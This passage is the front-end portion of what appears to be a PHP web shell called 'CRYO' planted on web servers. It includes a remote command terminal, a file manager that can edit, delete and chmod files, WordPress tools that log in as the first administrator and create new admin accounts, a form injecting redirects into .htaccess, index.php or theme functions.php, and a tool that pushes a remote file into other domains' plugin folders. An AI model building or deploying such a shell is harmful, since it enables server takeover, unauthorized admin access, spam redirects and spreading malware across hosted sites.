                <a href="?folder=<?= urlencode($rootDirectory) ?>"><i class="fas fa-home"></i> Home</a>
                <span class="separator">/</span>
                <a href="?folder=<?= urlencode($rootPath) ?>"><i class="fas fa-server"></i> Root</a>
                <span class="separator">/</span>
                <span class="current"><i class="fas fa-folder-open"></i> <?= htmlspecialchars($directory) ?></span>
            </div>

            <div class="breadcrumb" style="padding:8px 16px;font-size:11px">
                <?php
                $relativePath = substr($directory, strlen($rootPath));
                $relativePath = ltrim($relativePath, DIRECTORY_SEPARATOR);
                if ($relativePath !== '') {
                    $parts = explode(DIRECTORY_SEPARATOR, $relativePath);
                    $cumulative = $rootPath;
                    foreach ($parts as $index => $part) {
                        $cumulative = rtrim($cumulative, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $part;
                        $isLast = ($index === count($parts) - 1);
                        ?>
                        <span class="separator">/</span>
                        <?php if ($isLast): ?>
                            <span class="current"><?= htmlspecialchars($part) ?></span>
                        <?php else: ?>
                            <a href="?folder=<?= urlencode($cumulative) ?>"><?= htmlspecialchars($part) ?></a>
                        <?php endif;
                    }
                } else {
                    echo '<span class="separator">/</span>';
                    echo '<span class="current">/</span>';
                }
                ?>
            </div>

            <?php if (isset($_SESSION['error'])): ?>
                <div class="alert error"><i class="fas fa-circle-exclamation"></i> <?= $_SESSION['error']; unset($_SESSION['error']); ?></div>
            <?php endif; ?>
            <?php if (isset($_SESSION['success'])): ?>
                <div class="alert success"><i class="fas fa-circle-check"></i> <?= $_SESSION['success']; unset($_SESSION['success']); ?></div>
            <?php endif; ?>

            <form id="multiActionForm" method="post" class="flex gap-2 mb-3" style="flex-wrap:wrap;align-items:center">
                <button type="button" class="btn btn-sm" onclick="selectAll(true)"><i class="fas fa-check-double"></i> All</button>
                <button type="button" class="btn btn-sm" onclick="selectAll(false)"><i class="fas fa-xmark"></i> None</button>
                <button type="submit" name="deleteSelected" class="btn btn-sm btn-danger" onclick="return confirm('Delete selected?')" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-trash"></i> Delete</button>
                <input type="text" name="chmodSelectedValue" placeholder="755" style="width:65px;margin:0" pattern="[0-7]{3,4}">
                <button type="submit" name="chmodSelected" class="btn btn-sm" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-lock"></i></button>
                <select name="archive_format" style="width:90px;margin:0">
                    <option value="zip">ZIP</option>
                    <option value="tar">TAR</option>
                    <option value="tar.gz">TAR.GZ</option>
                    <option value="tar.bz2">TAR.BZ2</option>
                </select>
                <button type="submit" name="zipSelected" class="btn btn-sm btn-success" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-file-zipper"></i> Archive</button>
                <span class="text-muted" style="font-size:11px;margin-left:auto"><?= $totalItems ?> items | Page <?= $page ?>/<?= $totalPages ?></span>
            </form>

            <div class="file-header">
                <div style="width:28px"></div>
                <div style="width:28px"></div>
                <div style="flex:1">Name</div>
                <div style="min-width:60px;text-align:right">Size</div>
                <div style="min-width:60px;text-align:right">Perm</div>
                <div style="min-width:80px;text-align:right">Modified</div>
                <div style="min-width:140px;text-align:right">Actions</div>
            </div>

            <div class="file-list">
                <?php
                $no = 0;
                foreach ($filesAndFolders as $item):
                    $no++;
                    $fullpath = $directory . '/' . $item;
                    $colorClass = getPermissionColor($fullpath);
                    $perms = (is_readable($fullpath) && @fileperms($fullpath)) ? substr(sprintf('%o', fileperms($fullpath)), -4) : '----';
                    $timestamp = @filemtime($fullpath);
                    $dateModified = $timestamp ? date('Y-m-d H:i', $timestamp) : '-';
                    $sizeDisplay = is_file($fullpath) ? getNiceSize(@filesize($fullpath)) : (is_dir($fullpath) ? '-' : '-');
                    $isHtaccess = (basename($fullpath) === '.htaccess');
                ?>
                <div class="file-item <?= $colorClass ?>">
                    <div class="file-checkbox">
                        <input type="checkbox" class="select-item" name="selectedItems[]" value="<?= htmlspecialchars($item) ?>" form="multiActionForm">
                    </div>
                    <div class="file-icon">
                        <?php if (is_dir($fullpath)): ?>
                            <i class="fas fa-folder" style="color:#818cf8"></i>
                        <?php else: ?>
                            <?= getFileEmoji($item) ?>
                        <?php endif; ?>
                    </div>
                    <div class="file-name">
                        <?php if (is_dir($fullpath)): ?>
                            <a href="?folder=<?= urlencode($fullpath) ?>" title="<?= htmlspecialchars($item) ?>"><?= htmlspecialchars($item) ?></a>
                        <?php else: ?>
                            <form method="post" style="display:inline">
                                <input type="hidden" name="fileNameToEdit" value="<?= htmlspecialchars($item) ?>">
                                <button type="submit" name="edit" style="background:none;border:none;color:var(--text);cursor:pointer;font-family:inherit;font-size:13px;font-weight:500;padding:0" title="Edit"><?= htmlspecialchars($item) ?></button>
                            </form>
                        <?php endif; ?>
                    </div>
                    <div class="file-size"><?= $sizeDisplay ?></div>
                    <div class="file-perm"><?= $perms ?></div>
                    <div class="file-date"><?= $dateModified ?></div>
                    <div class="file-actions">
                        <a href="<?= htmlspecialchars(getDirectLink($fullpath)) ?>" target="_blank" class="btn btn-sm" title="Direct link"><i class="fas fa-link"></i></a>
                        <a href="?download=<?= urlencode($fullpath) ?>" class="btn btn-sm" title="Download"><i class="fas fa-download"></i></a>

                        <?php if (is_file($fullpath) && is_readable($fullpath) && ($isAdmin || ($isTeman && !$isHtaccess))): ?>
                            <a href="?view=<?= urlencode($fullpath) ?>" class="btn btn-sm" title="View"><i class="fas fa-eye"></i></a>
                        <?php endif; ?>

                        <?php if ($isAdmin || ($isTeman && !$isHtaccess)): ?>
                        <form method="post" style="display:inline">
                            <input type="hidden" name="oldName" value="<?= htmlspecialchars($item) ?>">
                            <input type="text" name="newName" placeholder="new name" style="width:70px;display:none;margin:0" class="rename-input">
                            <button type="button" class="btn btn-sm rename-btn" onclick="this.style.display='none';this.parentNode.querySelector('.rename-input').style.display='inline';this.parentNode.querySelector('button[name=rename]').style.display='inline'"><i class="fas fa-pen"></i></button>
                            <button type="submit" name="rename" style="display:none" class="btn btn-sm btn-success"><i class="fas fa-check"></i></button>
                        </form>
                        <?php endif; ?>

                        <?php if ($isAdmin): ?>
                        <form method="post" style="display:inline">
                            <input type="hidden" name="nameToChmod" value="<?= htmlspecialchars($item) ?>">
                            <input type="text" name="perm" placeholder="755" style="width:38px;margin:0">
                            <button type="submit" name="chmod" class="btn btn-sm"><i class="fas fa-lock"></i></button>
                        </form>
                        <?php endif; ?>

                        <?php if ($isAdmin || ($isTeman && !$isHtaccess)): ?>
                        <form class="ajax-delete-form" data-name="<?= htmlspecialchars($item) ?>" style="display:inline">
                            <input type="hidden" name="target" value="<?= htmlspecialchars($item) ?>">
                            <button type="button" class="btn btn-sm btn-danger delete-btn"><i class="fas fa-trash"></i></button>
                        </form>
                        <?php endif; ?>

                        <?php if ($isAdmin): ?>
                        <form method="post" style="display:inline">
                            <input type="hidden" name="itemToZip" value="<?= htmlspecialchars($item) ?>">
                            <button type="submit" name="zip" class="btn btn-sm" title="Zip"><i class="fas fa-file-zipper"></i></button>
                        </form>
                        <?php endif; ?>

                        <?php
                        $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                        $isArchive = in_array($ext, ['zip', 'tar', 'gz', 'bz2', 'rar']) || substr($item, -7) == '.tar.gz' || substr($item, -8) == '.tar.bz2';
                        if ($isArchive && ($isAdmin || $isTeman)):
                        ?>
                        <button type="button" class="btn btn-sm extract-btn" data-archive="<?= htmlspecialchars($item) ?>"><i class="fas fa-file-export"></i></button>
                        <?php endif; ?>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>

            <?php if ($totalPages > 1): ?>
                <div class="pagination">
                    <?php for ($i = 1; $i <= $totalPages; $i++): ?>
                        <?php if ($i == $page): ?>
                            <span class="page-link disabled"><?= $i ?></span>
                        <?php else: ?>
                            <a class="page-link" href="?folder=<?= urlencode($directory) ?>&page=<?= $i ?>"><?= $i ?></a>
                        <?php endif; ?>
                    <?php endfor; ?>
                </div>
            <?php endif; ?>
        </div>
    </div>

    <?php if ($isAdmin): ?>
    <div id="terminalModal" class="modal" style="align-items:flex-end;padding-bottom:0">
        <div class="modal-content" style="max-width:960px;width:100%;border-radius:16px 16px 0 0;padding:0;overflow:hidden;height:500px;display:flex;flex-direction:column">
            <div class="modal-header" style="background:rgba(10,14,26,0.95);padding:10px 16px;border-bottom:1px solid var(--border);border-radius:0;flex-shrink:0;margin:0">
                <div style="display:flex;align-items:center;gap:8px">
                    <i class="fas fa-terminal" style="color:var(--accent-h)"></i>
                    <span style="font-weight:600;font-size:13px">CRYO Terminal</span>
                    <span id="term-cwd-label" style="font-size:11px;color:var(--muted);margin-left:8px"></span>
                </div>
                <div style="display:flex;gap:6px;align-items:center">
                    <button class="btn btn-sm" onclick="termClear()" style="font-size:10px"><i class="fas fa-eraser"></i></button>
                    <button class="modal-close" onclick="closeTerminalModal()">&times;</button>
                </div>
            </div>
            <div id="term-output" style="flex:1;overflow-y:auto;background:rgba(10,14,26,0.98);padding:12px 16px;font-family:'JetBrains Mono',monospace;font-size:12px;color:#c9d1d9;white-space:pre-wrap;word-break:break-all"></div>
            <div style="display:flex;align-items:center;background:rgba(15,23,42,0.95);border-top:1px solid var(--border);padding:8px 16px;gap:8px;flex-shrink:0">
                <span id="term-prompt" style="color:var(--accent-h);font-family:'JetBrains Mono',monospace;font-size:12px;white-space:nowrap">$</span>
                <input id="term-input" type="text" placeholder="Type command..." autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" style="flex:1;background:transparent;border:none;outline:none;color:#c9d1d9;font-family:'JetBrains Mono',monospace;font-size:12px;margin:0;padding:0;box-shadow:none">
                <button class="btn btn-sm btn-primary" onclick="termExec()">Run</button>
            </div>
        </div>
    </div>
    <?php endif; ?>

    <div id="extractModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-file-export" style="color:var(--accent-h)"></i> Extract Archive</h3>
                <button class="modal-close" onclick="closeExtractModal()">&times;</button>
            </div>
            <form method="post">
                <input type="hidden" name="archive_file" id="extract-archive-file">
                <label style="font-size:12px;color:var(--muted);margin-bottom:4px;display:block">Destination directory</label>
                <input type="text" name="extract_dest" id="extract-dest" value="<?= htmlspecialchars($directory) ?>" required>
                <div class="modal-footer">
                    <button type="button" class="btn" onclick="closeExtractModal()">Cancel</button>
                    <button type="submit" name="extractArchive" class="btn btn-primary">Extract</button>
                </div>
            </form>
        </div>
    </div>

    <div id="editModal" class="modal">
        <div class="modal-content" style="max-width:860px;width:92%">
            <div class="modal-header">
                <h3><i class="fas fa-code" style="color:var(--accent-h)"></i> <span id="edit-filename"></span></h3>
                <button class="modal-close" onclick="closeEditModal()">&times;</button>
            </div>
            <div style="border:1px solid var(--border);border-radius:10px;overflow:hidden">
                <textarea id="edit-content" style="display:none"></textarea>
                <div id="editor-container"></div>
            </div>
            <div class="modal-footer">
                <button class="btn" onclick="closeEditModal()">Cancel</button>
                <button class="btn btn-primary" onclick="saveEdit()"><i class="fas fa-floppy-disk"></i> Save</button>
            </div>
        </div>
    </div>

    <div id="adminModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fab fa-wordpress" style="color:var(--accent-h)"></i> WordPress Admin Tools</h3>
                <button class="modal-close" onclick="closeAdminModal()">&times;</button>
            </div>
            <div>
                <h4 style="font-size:13px;margin-bottom:8px">Auto-login as first admin</h4>
                <input type="password" id="admin-pin" placeholder="PIN">
                <button class="btn btn-primary" onclick="adminLogin()">Login</button>
                <hr style="margin:16px 0;border-color:var(--border)">
                <h4 style="font-size:13px;margin-bottom:8px">Create new admin user</h4>
                <input type="text" id="admin-new-user" placeholder="Username">
                <input type="password" id="admin-new-pass" placeholder="Password">
                <input type="email" id="admin-new-email" placeholder="Email (optional)">
                <button class="btn btn-success" onclick="adminCreateUser()">Create</button>
            </div>
        </div>
    </div>

    <div id="redirectModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-arrow-right-arrow-left" style="color:var(--accent-h)"></i> Create 301 Redirect</h3>
                <button class="modal-close" onclick="closeRedirectModal()">&times;</button>
            </div>
            <form method="post" id="redirectForm">
                <input type="hidden" name="runRedirect301" value="1">
                <label style="font-size:12px;color:var(--muted)">Target file:</label>
                <select name="redirect_target_type">
                    <option value="htaccess">.htaccess (Document Root)</option>
                    <option value="index">index.php (Document Root)</option>
                    <option value="theme">Theme functions.php</option>
                </select>
                <label style="font-size:12px;color:var(--muted)">Source URL/path</label>
                <input type="text" name="redirect_source" placeholder="/old-page or homepage" required>
                <label style="font-size:12px;color:var(--muted)">Destination URL</label>
                <input type="url" name="redirect_target_url" value="<?= htmlspecialchars($redirectTargetDefault) ?>" required>
                <div class="modal-footer">
                    <button type="button" class="btn" onclick="closeRedirectModal()">Cancel</button>
                    <button type="submit" class="btn btn-primary">Create</button>
                </div>
            </form>
        </div>
    </div>

    <div id="scanModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-shield-halved" style="color:var(--accent-h)"></i> Security Scan</h3>
                <button class="modal-close" onclick="closeScanModal()">&times;</button>
            </div>
            <form method="post" id="scanForm">
                <div style="display:flex;flex-direction:column;gap:8px">
                    <label style="display:flex;align-items:center;gap:8px;font-size:12px;cursor:pointer"><input type="checkbox" name="scanHtaccess" value="1"> Scan .htaccess files</label>
                    <label style="display:flex;align-items:center;gap:8px;font-size:12px;cursor:pointer"><input type="checkbox" name="scanLocked" value="1"> Scan locked folders</label>
                    <label style="display:flex;align-items:center;gap:8px;font-size:12px;cursor:pointer"><input type="checkbox" name="scanWpAdmin" value="1" onchange="toggleWpVersion('admin')"> Scan wp-admin (checksum)</label>
                    <div id="wpVersionAdminBox" style="display:none;margin-left:24px">
                        <input type="text" name="wpVersionAdmin" placeholder="WP version (auto if empty)">
                    </div>
                    <label style="display:flex;align-items:center;gap:8px;font-size:12px;cursor:pointer"><input type="checkbox" name="scanWpIncludes" value="1" onchange="toggleWpVersion('includes')"> Scan wp-includes (checksum)</label>
                    <div id="wpVersionIncludesBox" style="display:none;margin-left:24px">
                        <input type="text" name="wpVersionIncludes" placeholder="WP version (auto if empty)">
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn" onclick="closeScanModal()">Cancel</button>
                    <button type="submit" class="btn btn-primary">Run Scan</button>
                </div>
            </form>
        </div>
    </div>

    <div id="deployModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-rocket" style="color:var(--accent-h)"></i> Deploy File to Domains</h3>
                <button class="modal-close" onclick="closeDeployModal()">&times;</button>
            </div>
            <?php
            $deployItems = isset($_SESSION['deploy_scan_items']) ? $_SESSION['deploy_scan_items'] : [];
            ?>
            <form method="post" id="deployForm">
                <?php if (empty($deployItems)): ?>
                    <p style="font-size:12px;color:var(--muted);margin-bottom:12px">No domains scanned yet. Click "Scan Folders" first.</p>
                    <button type="submit" name="deployScanDomains" class="btn btn-primary">Scan Domains</button>
                <?php else: ?>
                    <p style="font-size:12px;color:var(--muted);margin-bottom:8px">Select target domains:</p>
                    <div style="max-height:200px;overflow-y:auto;border:1px solid var(--border);padding:8px;border-radius:8px">
                        <?php foreach ($deployItems as $idx => $info): ?>
                            <label style="display:block;margin-bottom:4px;font-size:12px;cursor:pointer">
                                <input type="checkbox" name="deploy_file_targets[]" value="<?= $idx ?>">
                                <strong><?= htmlspecialchars($info['label']) ?></strong><br>
                                <span class="text-muted" style="font-size:11px;margin-left:20px"><?= htmlspecialchars($info['target']) ?></span>
                            </label>
                        <?php endforeach; ?>
                    </div>
                    <label style="font-size:12px;color:var(--muted);margin-top:8px;display:block">File URL</label>
                    <input type="url" name="deploy_file_url" required>
                    <label style="font-size:12px;color:var(--muted)">Custom filename (optional)</label>
                    <input type="text" name="deploy_file_name">
                    <label style="font-size:12px;color:var(--muted)">Subpath inside domain (optional)</label>
                    <input type="text" name="deploy_file_path" placeholder="e.g., wp-content/plugins">
                    <div class="modal-footer">
                        <button type="button" class="btn" onclick="closeDeployModal()">Cancel</button>
                        <button type="submit" name="deployRunFile" class="btn btn-primary">Deploy</button>
                    </div>
                <?php endif; ?>
                <button type="submit" name="deployReset" class="btn btn-sm mt-2" style="font-size:10px">Reset Scan</button>
            </form>
        </div>
    </div>

    <div id="toast-container" class="toast-container"></div>

    <script>
        function showToast(msg, type) {
            const c = document.getElementById('toast-container');
            const t = document.createElement('div');
            t.className = 'toast alert ' + (type || 'success');
            t.innerHTML = msg;
            c.appendChild(t);
            setTimeout(() => { t.style.opacity='0'; t.style.transform='translateX(40px)'; setTimeout(() => t.remove(), 300); }, 8000);
        }

        function selectAll(checked) {
            document.querySelectorAll('.select-item').forEach(cb => cb.checked = checked);
        }

        document.querySelectorAll('.ajax-delete-form').forEach(form => {
            form.querySelector('.delete-btn').addEventListener('click', function() {
                if (!confirm('Delete this item?')) return;
                const name = form.dataset.name;
                const formData = new FormData();
                formData.append('target', name);
                fetch('?ajax_delete=1&folder=<?= urlencode($directory) ?>', {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(data => {
                    if (data.success) location.reload();
                    else alert('Delete failed');
                });
            });
        });

        document.querySelectorAll('.extract-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.getElementById('extract-archive-file').value = this.dataset.archive;
                document.getElementById('extract-dest').value = '<?= htmlspecialchars($directory) ?>';
                document.getElementById('extractModal').style.display = 'flex';
            });
        });

        function closeExtractModal() { document.getElementById('extractModal').style.display = 'none'; }

        function showAdminModal() { document.getElementById('adminModal').style.display = 'flex'; }
        function closeAdminModal() { document.getElementById('adminModal').style.display = 'none'; }
        function adminLogin() {
            const pin = document.getElementById('admin-pin').value;
            if (!pin) return alert('PIN required');
            const form = document.createElement('form');
            form.method = 'post';
            form.innerHTML = '<input type="hidden" name="admin_pin" value="'+escapeHtml(pin)+'"><input type="hidden" name="auto_admin_login" value="1">';
            document.body.appendChild(form);
            form.submit();
        }
        function adminCreateUser() {
            const pin = document.getElementById('admin-pin').value;
            const user = document.getElementById('admin-new-user').value;
            const pass = document.getElementById('admin-new-pass').value;
            const email = document.getElementById('admin-new-email').value;
            if (!pin) return alert('PIN required');
            if (!user || !pass) return alert('Username & Password required');
            const form = document.createElement('form');
            form.method = 'post';
            form.innerHTML = '<input type="hidden" name="admin_pin" value="'+escapeHtml(pin)+'"><input type="hidden" name="admin_new_user" value="'+escapeHtml(user)+'"><input type="hidden" name="admin_new_pass" value="'+escapeHtml(pass)+'"><input type="hidden" name="admin_new_email" value="'+escapeHtml(email)+'"><input type="hidden" name="create_admin_user" value="1">';
            document.body.appendChild(form);
            form.submit();
        }

        function escapeHtml(str) {
            const div = document.createElement('div');
            div.appendChild(document.createTextNode(str));
            return div.innerHTML;
        }

        function showScanModal() { document.getElementById('scanModal').style.display = 'flex'; }
        function closeScanModal() { document.getElementById('scanModal').style.display = 'none'; }
        function toggleWpVersion(type) {
            const box = document.getElementById('wpVersion' + (type === 'admin' ? 'Admin' : 'Includes') + 'Box');
            const cb = document.querySelector('input[name="scan' + (type === 'admin' ? 'WpAdmin' : 'WpIncludes') + '"]');
            box.style.display = cb.checked ? 'block' : 'none';
        }

        function showRedirectModal() { document.getElementById('redirectModal').style.display = 'flex'; }
        function closeRedirectModal() { document.getElementById('redirectModal').style.display = 'none'; }

        function showDeployModal() { document.getElementById('deployModal').style.display = 'flex'; }
        function closeDeployModal() { document.getElementById('deployModal').style.display = 'none'; }

        let editorInstance = null;
        let currentEditFile = '';

        function openEditModal(filename) {
            currentEditFile = filename;
            document.getElementById('edit-filename').textContent = filename;
            document.getElementById('editModal').style.display = 'flex';

            fetch('?get_file_content=' + encodeURIComponent(filename) + '&folder=<?= urlencode($directory) ?>')
                .then(res => {
                    if (!res.ok) throw new Error('Cannot read file');
                    return res.text();
                })
                .then(content => {
                    if (!editorInstance) {
                        editorInstance = CodeMirror(document.getElementById('editor-container'), {
                            value: content,
                            lineNumbers: true,
                            mode: 'php',
                            theme: 'material-darker',
                            indentUnit: 4,
                            tabSize: 4,
                            lineWrapping: true
                        });
                    } else {
                        editorInstance.setValue(content);
                    }

                    const ext = filename.split('.').pop().toLowerCase();
                    const modeMap = {
                        'php': 'php',
                        'html': 'htmlmixed',
                        'htm': 'htmlmixed',
                        'js': 'javascript',
                        'css': 'css',
                        'xml': 'xml',
                        'json': 'javascript',
                        'txt': 'text/plain'
                    };
                    editorInstance.setOption('mode', modeMap[ext] || 'php');
                    editorInstance.refresh();
                })
                .catch(err => {
                    alert('Error: ' + err.message);
                    closeEditModal();
                });
        }

        function closeEditModal() {
            document.getElementById('editModal').style.display = 'none';
        }

        function saveEdit() {
            if (!editorInstance) return;
            const content = editorInstance.getValue();

            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({
                    'save_edit': '1',
                    'file': currentEditFile,
                    'content': content
                })
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    showToast('<i class="fas fa-circle-check"></i> File saved successfully.', 'success');
                    closeEditModal();
                } else {
                    alert('Error: ' + (data.error || 'Unknown error'));
                }
            })
            .catch(err => alert('Error: ' + err.message));
        }

        document.addEventListener('DOMContentLoaded', function() {
            document.querySelectorAll('.file-item form button[name="edit"]').forEach(btn => {
                btn.addEventListener('click', function(e) {
                    e.preventDefault();
                    const form = this.closest('form');
                    const fileNameInput = form.querySelector('input[name="fileNameToEdit"]');
                    if (fileNameInput) {
                        openEditModal(fileNameInput.value);
                    }
                });
            });
        });

        <?php if ($isAdmin): ?>
        (function() {
            let termCwd = <?= json_encode($rootDirectory) ?>;
            let termHistory = [];
            let termHistIdx = -1;

            const HELP_TEXT = [
                '  CRYO Terminal v2.0 — Command Reference',
                '  ═══════════════════════════════════════',
                '',
                '  NAVIGATION',
                '    pwd              Show current directory',
                '    ls / ls -la      List directory contents',
                '    cd <folder>      Change directory',
                '    cd .. / cd ~     Go up / go to Document Root',
                '',
                '  FILE MANAGEMENT',
                '    cat / head / tail    View file contents',
                '    cp / mv / rm        Copy / Move / Delete',
                '    mkdir / touch       Create folder / file',
                '    chmod 755 <f>       Change permissions',
                '',
                '  SYSTEM INFO',
                '    whoami / uname -a / df -h / free -h',
                '    php -v / ps aux',
                '',
                '  SEARCH',
                '    find . -name "*.php"    Find files',
                '    grep -r "text" .        Search in files',
                '',
                '  TERMINAL',
                '    clear    Clear screen',
                '    help     Show this help',
                '',
                '  TIP: Use Arrow Up/Down for command history',
            ].join('\n');

            window.showTerminalModal = function() {
                const modal = document.getElementById('terminalModal');
                modal.style.display = 'flex';
                updatePrompt();
                if (document.getElementById('term-output').innerHTML === '') {
                    appendOutput('CRYO Terminal v2.0 — type \'help\' for commands', 'info');
                    appendOutput('Working Directory: ' + termCwd, 'muted');
                    appendOutput('', '');
                }
                document.getElementById('term-input').focus();
            };

            window.closeTerminalModal = function() {
                document.getElementById('terminalModal').style.display = 'none';
            };

            window.termClear = function() {
                document.getElementById('term-output').innerHTML = '';
            };

            function updatePrompt() {
                const shortCwd = termCwd.length > 40 ? '...' + termCwd.slice(-37) : termCwd;
                document.getElementById('term-cwd-label').textContent = '[' + shortCwd + ']';
                document.getElementById('term-prompt').textContent = '$ ';
            }

            function appendOutput(text, type) {
                const out = document.getElementById('term-output');
                const line = document.createElement('div');
                line.style.marginBottom = '1px';
                if (type === 'cmd') { line.style.color = '#818cf8'; line.textContent = '$ ' + text; }
                else if (type === 'error') { line.style.color = '#f87171'; line.textContent = text; }
                else if (type === 'info') { line.style.color = '#818cf8'; line.textContent = text; }
                else if (type === 'muted') { line.style.color = '#64748b'; line.textContent = text; }
                else if (type === 'success') { line.style.color = '#34d399'; line.textContent = text; }
                else { line.style.color = '#c9d1d9'; line.textContent = text; }
                out.appendChild(line);
                out.scrollTop = out.scrollHeight;
            }

            window.termExec = function() {
                const input = document.getElementById('term-input');
                const cmd = input.value.trim();
                input.value = '';

                if (cmd === '') return;

                termHistory.unshift(cmd);
                if (termHistory.length > 100) termHistory.pop();
                termHistIdx = -1;

                appendOutput(cmd, 'cmd');

                if (cmd === 'help') {
                    HELP_TEXT.split('\n').forEach(line => appendOutput(line, ''));
                    return;
                }

                const formData = new FormData();
                formData.append('exec_cmd', '1');
                formData.append('cmd', cmd);
                formData.append('cwd', termCwd);

                fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(data => {
                    if (data.output === '__CLEAR__') {
                        document.getElementById('term-output').innerHTML = '';
                    } else if (data.output !== '') {
                        const lines = data.output.split('\n');
                        lines.forEach(line => appendOutput(line, ''));
                    }
                    termCwd = data.cwd || termCwd;
                    updatePrompt();
                })
                .catch(err => {
                    appendOutput('Error: ' + err.message, 'error');
                });
            };

            document.addEventListener('DOMContentLoaded', function() {
                const input = document.getElementById('term-input');
                if (!input) return;
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Enter') {
                        window.termExec();
                    } else if (e.key === 'ArrowUp') {
                        e.preventDefault();
                        if (termHistIdx < termHistory.length - 1) {
                            termHistIdx++;
                            input.value = termHistory[termHistIdx];
                        }
                    } else if (e.key === 'ArrowDown') {
                        e.preventDefault();
                        if (termHistIdx > 0) {
                            termHistIdx--;
                            input.value = termHistory[termHistIdx];
                        } else {
                            termHistIdx = -1;
                            input.value = '';
                        }
                    }
                });
            });
        })();
        <?php endif; ?>
    </script>

    <?php if (isset($_SESSION['htreplace_message'])): ?>
    <script>showToast(<?= json_encode($_SESSION['htreplace_message']) ?>, <?= json_encode(isset($_SESSION['htreplace_status']) && $_SESSION['htreplace_status'] === 'error' ? 'error' : 'success') ?>);</script>
    <?php unset($_SESSION['htreplace_message'], $_SESSION['htreplace_status']); endif; ?>

    <?php if (isset($_SESSION['ts_message'])): ?>
    <script>showToast(<?= json_encode($_SESSION['ts_message']) ?>, <?= json_encode(isset($_SESSION['ts_status']) ? ($_SESSION['ts_status'] === 'error' ? 'error' : ($_SESSION['ts_status'] === 'partial' ? 'warning' : 'success')) : 'success') ?>);</script>
    <?php unset($_SESSION['ts_message'], $_SESSION['ts_status']); endif; ?>

    <?php if (isset($_SESSION['redirect_message'])): ?>
    <script>showToast(<?= json_encode($_SESSION['redirect_message']) ?>, <?= json_encode(isset($_SESSION['redirect_status']) && $_SESSION['redirect_status'] === 'error' ? 'error' : 'success') ?>);</script>
    <?php unset($_SESSION['redirect_message'], $_SESSION['redirect_status']); endif; ?>

    <?php if (isset($_SESSION['admin_pin_error'])): ?>
    <script>showToast(<?= json_encode($_SESSION['admin_pin_error']) ?>, 'error');</script>
    <?php unset($_SESSION['admin_pin_error']); endif; ?>

    <?php if (isset($_SESSION['admin_create_status'])): ?>
    <script>showToast(<?= json_encode($_SESSION['admin_create_status']) ?>, <?= json_encode(strpos($_SESSION['admin_create_status'], 'Berhasil') !== false ? 'success' : 'error') ?>);</script>
    <?php unset($_SESSION['admin_create_status']); endif; ?>

    <?php if (isset($_SESSION['deploy_file_message'])): ?>
    <script>showToast(<?= json_encode($_SESSION['deploy_file_message']) ?>, <?= json_encode(isset($_SESSION['deploy_file_status']) ? ($_SESSION['deploy_file_status'] === 'error' ? 'error' : ($_SESSION['deploy_file_status'] === 'partial' ? 'warning' : 'success')) : 'success') ?>);</script>
    <?php unset($_SESSION['deploy_file_message'], $_SESSION['deploy_file_status']); endif; ?>


</body>
</html>
<?php
ob_end_flush();
?>